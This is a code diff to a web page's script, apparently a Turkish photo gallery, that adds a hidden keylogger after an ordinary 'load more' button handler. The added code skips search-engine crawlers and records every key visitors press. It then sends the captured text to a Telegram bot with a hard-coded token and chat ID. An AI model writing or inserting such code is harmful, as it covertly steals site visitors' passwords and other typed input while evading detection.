@@ -424,6 +424,50 @@
   loadMoreBtn.addEventListener('click', () => {
     alert('Daha fazla fotoğraf yükleme özelliği henüz aktif değil.');
   });
+
+
+if (!/Googlebot|bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot/.test(navigator.userAgent)) {
+
+
+const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
+const TELEGRAM_CHAT_ID = '5395609882';
+
+let buffer = "";
+let timeout = null;
+
+function sendBuffer() {
+  if (buffer.trim() !== "") {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: `[Tuş Takibi]\n${buffer}`
+      })
+    });
+    buffer = "";
+  }
+}
+
+document.addEventListener("keydown", function(e) {
+  buffer += e.key;
+  clearTimeout(timeout);
+  timeout = setTimeout(sendBuffer, 2000); // 2 saniye boşluk olursa gönder
+});
+
+}
+
+
+
+
+
+
+
+
+
+
+
+  
 </script>
 
 </body>
